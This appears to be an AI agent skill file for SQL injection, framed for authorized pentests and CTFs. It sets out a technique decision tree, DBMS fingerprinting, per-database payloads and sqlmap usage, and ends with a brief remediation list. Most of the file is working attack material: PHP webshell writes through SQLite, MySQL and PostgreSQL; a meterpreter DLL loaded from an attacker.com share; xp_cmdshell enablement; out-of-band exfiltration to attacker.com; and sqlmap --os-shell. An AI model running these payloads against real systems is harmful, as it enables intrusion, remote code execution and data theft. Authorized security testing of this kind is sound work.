---
name: sqli-specialist
description: SQL injection specialist for authorized pentests and CTF — covers MySQL, MSSQL, PostgreSQL, Oracle (sqli-surgeon) and SQLite, DB2, Sybase, Informix, Firebird, HQL, ClickHouse, BigQuery, CockroachDB, Cassandra CQL (sqli-shapeshifter). Use when asked to test for, exploit, or defend against SQL injection in any DBMS. Triggers on: sql injection, SQLi, union select, blind injection, time-based injection, second-order injection, OOB exfil, sqlmap, ATTACH DATABASE, load_extension.
---

# Skill: sqli-specialist

## Trigger

Fire whenever the task involves:
- Detecting or confirming SQL injection in any DBMS
- Choosing or executing a technique (UNION, error-based, boolean-blind, time-based, OOB/OAST, second-order)
- Exploiting exotic DBMS: SQLite, DB2, Sybase/ASE, Informix, Firebird, HQL/Hibernate, ClickHouse, Snowflake, BigQuery, CockroachDB, Cassandra CQL
- sqlmap configuration, tamper script selection, or --os-shell escalation
- Parameterization, prepared-statement remediation
- WAF bypass for SQLi payloads (hand off payload crafting to waf-bypass-techniques skill)

## Instructions

### Phase 1 — Technique Selection Decision Tree

```
Does the app return DB error messages?
  YES → Error-based (fastest extraction, no blind needed)
  NO  → continue

Does response differ on True vs False condition?
  YES → Boolean-blind (methodical, no timing dependency)
  NO  → continue

Does response time differ on SLEEP(5) vs no sleep?
  YES → Time-based blind
  NO  → continue

Is DNS/HTTP callback available?
  YES → OOB/OAST via interactsh or Burp Collaborator
  NO  → Re-examine injection point (may be second-order)
```

### Phase 2 — DBMS Fingerprinting

| Signal | DBMS |
|--------|------|
| `SLEEP(5)` delays | MySQL/MariaDB |
| `WAITFOR DELAY '0:0:5'` delays | MSSQL |
| `pg_sleep(5)` delays | PostgreSQL |
| `dbms_pipe.receive_message` | Oracle |
| `sqlite_version()` returns | SQLite |
| `SYSDUMMY1` table exists | DB2/Informix |
| `randomblob(500000000)` delays | SQLite (timing) |

### Phase 3 — Per-DBMS Key Primitives

**SQLite (sqli-shapeshifter domain)**
```sql
-- Schema extraction
SELECT group_concat(name) FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='target_table';

-- ATTACH DATABASE webshell (requires stacked queries + write perm)
ATTACH DATABASE '/var/www/html/shell.php' AS loot;
CREATE TABLE loot.pwn (dataz text);
INSERT INTO loot.pwn VALUES ('<?php system($_GET["cmd"]); ?>');

-- load_extension RCE (requires enable_load_extension=True in binding)
UNION SELECT 1,load_extension('/tmp/evil.so'),3--
-- Windows UNC (no local write):
UNION SELECT 1,load_extension('\\attacker.com\share\meterpreter.dll','DllMain'),3--

-- Timing (no SLEEP built-in)
SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END
```

**MySQL/MariaDB**
```sql
-- Version / user
SELECT version(), user(), database();
-- File read (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
-- File write (webshell, requires FILE + write perm)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-- OOB DNS exfil
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share\\a'));
```

**MSSQL**
```sql
-- xp_cmdshell (needs sysadmin)
EXEC xp_cmdshell 'whoami';
-- Enable if disabled:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-- OOB DNS
EXEC master..xp_dirtree '\\attacker.com\a'--
-- Stacked queries: ; after each statement
```

**PostgreSQL**
```sql
-- COPY to/from file (superuser)
COPY (SELECT '') TO '/var/www/html/shell.php';
-- RCE via COPY
COPY cmd_exec FROM PROGRAM 'id';
-- Large object RCE
SELECT lo_from_bytea(43210,'<?php system($_GET["c"]); ?>');
```

**Oracle**
```sql
-- No stacked queries
-- UTL_HTTP OOB
SELECT UTL_HTTP.request('http://attacker.com/'||user) FROM dual;
-- UTL_FILE write (requires directory object)
UTL_FILE.put_line(fh, 'payload');
```

### Phase 4 — sqlmap Key Flags

```bash
# Full detection + exploitation
sqlmap -u "http://target/page?id=1" --dbs --batch --level=5 --risk=3

# Technique selection (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline-query)
sqlmap -u "..." --technique=BEUST

# OOB DNS exfil (needs interactsh/Collaborator)
sqlmap -u "..." --dns-domain=attacker.com

# WAF bypass with tamper (chain multiple)
sqlmap -u "..." --tamper=space2comment,between,randomcase

# OS shell (requires stacked + write perm)
sqlmap -u "..." --os-shell

# Second-order injection (URL that triggers the stored payload)
sqlmap -u "..." --second-url="http://target/profile"

# Request file (from Burp)
sqlmap -r request.txt --dbs
```

### Phase 5 — OOB / OAST Setup

```bash
# interactsh-client (MIT, v1.4.1)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client   # generates *.oast.fun domain

# Use domain in sqlmap
sqlmap -u "..." --dns-domain=xxx.oast.fun
```

### Phase 6 — Second-Order Injection Pattern

```
1. Register with username: admin'--
2. App stores raw (no SQLi yet at registration)
3. App later uses stored value in a second query:
   SELECT * FROM posts WHERE author='admin'--'
4. The comment terminates the query → logic change or error
Key: injection point and execution point are different requests
```

### Phase 7 — Remediation (pair every finding)

- Parameterized queries / prepared statements (language-specific drivers)
- ORM with typed parameters — never `.format()` or `%s` with unsanitized input
- Principle of least privilege: app DB user has no FILE, no xp_cmdshell, no SUPERUSER
- WAF as defense-in-depth only, not the primary control

## References

- swisskyrepo/PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings (82,092 stars, MIT)
- sqlmapproject/sqlmap — https://github.com/sqlmapproject/sqlmap (38,800 stars, GPL-2.0)
- r0oth3x49/ghauri — https://github.com/r0oth3x49/ghauri (4,100 stars, MIT)
- unicornsasfuel/sqlite_sqli_cheat_sheet — https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet (101 stars, MIT)
- regaan/sqlmap-tamper-collection — https://github.com/regaan/sqlmap-tamper-collection
- projectdiscovery/interactsh — https://github.com/projectdiscovery/interactsh (MIT, v1.4.1)
- yaklang/hack-skills sqli-sql-injection — https://github.com/yaklang/hack-skills (2,551 stars, MIT)
- zebbern/claude-code-guide sql-injection-testing — https://github.com/zebbern/claude-code-guide
- Source reports: sqli-surgeon-deep-research-2026-10-27.md, sqli-shapeshifter-deep-research-2026-10-27.md